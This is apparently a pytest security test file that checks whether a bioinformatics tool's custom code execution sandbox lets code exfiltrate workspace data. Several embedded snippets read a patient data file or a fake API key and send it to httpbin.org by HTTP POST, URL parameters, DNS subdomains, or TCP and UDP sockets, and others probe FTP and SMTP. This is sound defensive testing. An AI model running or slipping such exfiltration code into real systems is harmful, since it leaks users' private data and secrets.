"""
Network Exfiltration Security Tests

Tests for network-based data exfiltration vulnerabilities in CustomCodeExecutionService.
Each test represents a potential attack vector for stealing workspace data via network.

Test Naming Convention:
- test_*_EXPECT_SUCCESS: Attack should succeed (vulnerability exists)
- test_*_EXPECT_BLOCKED: Attack should be blocked (protection exists)

Run with: pytest tests/manual/custom_code_execution/01_data_exfiltration/test_network_exfiltration.py -v
"""

import pytest
import time
from pathlib import Path
import anndata
import numpy as np
import pandas as pd

from lobster.core.data_manager_v2 import DataManagerV2
from lobster.services.execution import CustomCodeExecutionService, CodeExecutionError


class TestNetworkExfiltration:
    """Test network-based data exfiltration attack vectors."""

    @pytest.fixture
    def workspace(self, tmp_path):
        """Create test workspace with sensitive data."""
        workspace = tmp_path / ".lobster_workspace"
        workspace.mkdir()

        # Create sensitive data file
        sensitive_df = pd.DataFrame({
            'patient_id': ['P001', 'P002', 'P003'],
            'diagnosis': ['CRC', 'IBD', 'Control'],
            'api_key': ['sk-ant-api03-SECRET', 'sk-ant-api03-SECRET2', 'sk-ant-api03-SECRET3']
        })
        sensitive_df.to_csv(workspace / "patient_data.csv", index=False)

        return workspace

    @pytest.fixture
    def data_manager(self, workspace):
        """Create DataManagerV2 with test modality."""
        dm = DataManagerV2(workspace_path=workspace)

        # Add test modality with sensitive metadata
        adata = anndata.AnnData(
            X=np.array([[1, 2, 3], [4, 5, 6], [7, 8, 9]]),
            obs=pd.DataFrame({
                'patient': ['P001', 'P002', 'P003'],
                'condition': ['cancer', 'disease', 'control']
            }, index=['c1', 'c2', 'c3']),
            var=pd.DataFrame({'gene': ['BRCA1', 'TP53', 'KRAS']}, index=['g1', 'g2', 'g3'])
        )
        dm.modalities['sensitive_data'] = adata

        return dm

    @pytest.fixture
    def service(self, data_manager):
        """Create service instance."""
        return CustomCodeExecutionService(data_manager)

    # ========== HTTP/HTTPS Exfiltration ==========

    def test_http_request_urllib_EXPECT_SUCCESS(self, service):
        """
        Test: HTTP GET request using urllib
        Expected: SUCCESS (vulnerability - network not blocked)
        Impact: CRITICAL - Can exfiltrate data to external servers
        """
        code = '''
import urllib.request
try:
    response = urllib.request.urlopen('http://httpbin.org/status/200', timeout=5)
    result = f"VULNERABILITY: Network access allowed, status={response.code}"
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[HTTP urllib] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: HTTP requests allowed via urllib")
            assert "VULNERABILITY" in str(result), "Network exfiltration possible via urllib"
        else:
            print("✅ PROTECTED: HTTP requests blocked")
            assert "PROTECTED" in str(result)

    def test_http_post_data_exfiltration_EXPECT_SUCCESS(self, service):
        """
        Test: HTTP POST to exfiltrate workspace file content
        Expected: SUCCESS (vulnerability - can POST sensitive data)
        Impact: CRITICAL - Direct data theft
        """
        code = '''
import urllib.request
import json

# Simulate exfiltrating workspace data
try:
    # Read sensitive file
    with open('patient_data.csv') as f:
        data = f.read()

    # Attempt to POST to external server (using httpbin for testing)
    request = urllib.request.Request(
        'http://httpbin.org/post',
        data=json.dumps({'stolen_data': data[:100]}).encode('utf-8'),
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    response = urllib.request.urlopen(request, timeout=5)
    result = f"VULNERABILITY: Data exfiltrated via HTTP POST (status {response.code})"
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}: {str(e)[:50]}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[HTTP POST Exfiltration] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: Can POST sensitive data to external servers")
            assert "VULNERABILITY" in str(result), "Data exfiltration via HTTP POST possible"
        else:
            print("✅ PROTECTED: HTTP POST blocked")
            assert "PROTECTED" in str(result)

    def test_http_get_with_encoded_data_EXPECT_SUCCESS(self, service):
        """
        Test: Encode data in URL parameters (GET request steganography)
        Expected: SUCCESS (vulnerability)
        Impact: CRITICAL - Covert data exfiltration
        """
        code = '''
import urllib.request
import urllib.parse

try:
    # Encode sensitive data in URL params
    secret = "sk-ant-api03-SECRET"
    encoded = urllib.parse.quote(secret)
    url = f'http://httpbin.org/get?data={encoded}'

    response = urllib.request.urlopen(url, timeout=5)
    result = f"VULNERABILITY: Encoded data in URL, status={response.code}"
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[URL Encoding] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: Can encode data in HTTP GET URLs")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: URL encoding blocked")
            assert "PROTECTED" in str(result)

    # ========== DNS Exfiltration ==========

    def test_dns_query_exfiltration_EXPECT_SUCCESS(self, service):
        """
        Test: DNS query with encoded data (classic exfiltration technique)
        Expected: SUCCESS (vulnerability - DNS not blocked)
        Impact: CRITICAL - Covert channel, hard to detect
        """
        code = '''
import socket

try:
    # Encode data in subdomain (classic DNS exfiltration)
    secret = "SECRET123"
    domain = f"{secret}.example.com"

    # Attempt DNS lookup (will fail but proves DNS access)
    try:
        socket.gethostbyname(domain)
        result = f"VULNERABILITY: DNS query sent for {domain}"
    except socket.gaierror:
        # DNS query WAS sent (just no response), this is still a vulnerability
        result = f"VULNERABILITY: DNS exfiltration possible (query sent, no response expected)"
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[DNS Exfiltration] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: DNS queries allowed - covert exfiltration channel")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: DNS queries blocked")
            assert "PROTECTED" in str(result)

    # ========== Raw Socket Exfiltration ==========

    def test_tcp_socket_connection_EXPECT_SUCCESS(self, service):
        """
        Test: Create raw TCP socket connection
        Expected: SUCCESS (vulnerability - sockets not blocked)
        Impact: CRITICAL - Bypasses HTTP-level restrictions
        """
        code = '''
import socket

try:
    # Attempt to create TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2)

    # Try to connect to public server
    try:
        sock.connect(("httpbin.org", 80))
        result = "VULNERABILITY: TCP socket connection established"
        sock.close()
    except (socket.timeout, ConnectionRefusedError, OSError):
        # Socket creation worked, connection failed (still a vulnerability)
        result = "VULNERABILITY: TCP socket creation allowed (connection failed)"
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[TCP Socket] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: Raw TCP sockets allowed")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: Socket creation blocked")
            assert "PROTECTED" in str(result)

    def test_udp_socket_exfiltration_EXPECT_SUCCESS(self, service):
        """
        Test: Send data via UDP socket
        Expected: SUCCESS (vulnerability - UDP not blocked)
        Impact: CRITICAL - Connectionless exfiltration
        """
        code = '''
import socket

try:
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)

    # Send data (fire-and-forget, no error if server doesn't exist)
    message = b"EXFILTRATED_DATA"
    sock.sendto(message, ("8.8.8.8", 53))  # Google DNS

    result = "VULNERABILITY: UDP socket send successful"
    sock.close()
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[UDP Socket] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: UDP sockets allowed - connectionless exfiltration")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: UDP sockets blocked")
            assert "PROTECTED" in str(result)

    # ========== Alternative Network Libraries ==========

    def test_http_client_library_EXPECT_SUCCESS(self, service):
        """
        Test: Using http.client (standard library)
        Expected: SUCCESS (vulnerability - another HTTP library)
        Impact: CRITICAL - Alternative to urllib
        """
        code = '''
import http.client

try:
    conn = http.client.HTTPConnection("httpbin.org", timeout=5)
    conn.request("GET", "/status/200")
    response = conn.getresponse()
    result = f"VULNERABILITY: http.client allowed, status={response.status}"
    conn.close()
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[http.client] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  CRITICAL VULNERABILITY: http.client library accessible")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: http.client blocked")
            assert "PROTECTED" in str(result)

    def test_ftplib_exfiltration_EXPECT_SUCCESS(self, service):
        """
        Test: FTP connection attempt
        Expected: SUCCESS (vulnerability - FTP not blocked)
        Impact: HIGH - Alternative exfiltration channel
        """
        code = '''
from ftplib import FTP

try:
    ftp = FTP(timeout=2)
    # This will likely fail to connect, but proves FTP import works
    result = "VULNERABILITY: FTP library import successful (connection would work with valid server)"
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[FTP] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  HIGH VULNERABILITY: FTP library accessible")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: FTP blocked")
            assert "PROTECTED" in str(result)

    # ========== SMTP Email Exfiltration ==========

    def test_smtp_email_exfiltration_EXPECT_SUCCESS(self, service):
        """
        Test: Send email via SMTP
        Expected: SUCCESS (vulnerability - SMTP not blocked)
        Impact: HIGH - Email-based exfiltration
        """
        code = '''
import smtplib

try:
    # Attempt SMTP connection (will fail without credentials, but proves access)
    smtp = smtplib.SMTP("smtp.gmail.com", 587, timeout=5)
    result = "VULNERABILITY: SMTP connection established (email exfiltration possible with credentials)"
    smtp.quit()
except Exception as e:
    # Connection attempt proves SMTP is accessible
    if "Connection" in str(e) or "timeout" in str(e).lower():
        result = "VULNERABILITY: SMTP library accessible (network connection attempted)"
    else:
        result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[SMTP Email] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  HIGH VULNERABILITY: SMTP accessible - email exfiltration possible")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: SMTP blocked")
            assert "PROTECTED" in str(result)

    # ========== Timing/Inference Attacks ==========

    def test_timing_side_channel_EXPECT_SUCCESS(self, service):
        """
        Test: Use network timing to leak data bit-by-bit
        Expected: SUCCESS (vulnerability - covert timing channel)
        Impact: MEDIUM - Slow but undetectable
        """
        code = '''
import socket
import time

try:
    # Leak data via timing side channel
    # Fast network access = bit 1, timeout = bit 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)

    # Encode binary data: 1 = connect attempt, 0 = no connection
    secret_bit = 1  # Example: leak one bit

    if secret_bit == 1:
        try:
            sock.connect(("httpbin.org", 80))
        except:
            pass

    result = "VULNERABILITY: Timing side-channel possible (leak data via network timing)"
    sock.close()
except Exception as e:
    result = f"PROTECTED: {type(e).__name__}"
'''

        result, stats, ir = service.execute(code, persist=False, timeout=10)

        print(f"\n[Timing Side-Channel] Result: {result}")

        if "VULNERABILITY" in str(result):
            print("⚠️  MEDIUM VULNERABILITY: Timing side-channels possible")
            assert "VULNERABILITY" in str(result)
        else:
            print("✅ PROTECTED: Timing attacks blocked")
            assert "PROTECTED" in str(result)


class TestNetworkExfiltrationSummary:
    """Generate summary report of network exfiltration tests."""

    def test_generate_summary(self):
        """Print summary of network attack vectors."""
        print("\n" + "="*70)
        print("NETWORK EXFILTRATION ATTACK SURFACE SUMMARY")
        print("="*70)
        print("\nTested Attack Vectors:")
        print("1. ⚠️  HTTP GET (urllib)")
        print("2. ⚠️  HTTP POST with data")
        print("3. ⚠️  URL parameter encoding")
        print("4. ⚠️  DNS queries (covert channel)")
        print("5. ⚠️  TCP sockets")
        print("6. ⚠️  UDP sockets")
        print("7. ⚠️  http.client library")
        print("8. ⚠️  FTP connections")
        print("9. ⚠️  SMTP email")
        print("10. ⚠️ Timing side-channels")
        print("\nExpected Result: All 10 vulnerabilities should be confirmed")
        print("="*70 + "\n")

        assert True  # Always pass - this is just a summary
